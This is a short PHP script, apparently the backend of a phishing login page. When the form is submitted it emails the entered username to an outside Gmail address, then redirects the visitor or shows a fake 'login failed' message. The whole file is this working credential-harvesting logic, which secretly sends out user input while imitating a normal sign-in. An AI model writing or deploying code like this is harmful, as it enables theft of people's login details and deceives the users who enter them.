<?php
if (isset($_POST['lt'])) {
    $username = $_POST['username'];

    $to = "receptor@gmail.com";
    $subject = "Información de usuario";
    $message = "Nombre de usuario encontrado: $username";

    if (mail($to, $subject, $message)) {
        header("Location: index.html");
    } else {
        echo "fallo al iniciar sesion";
    }
}
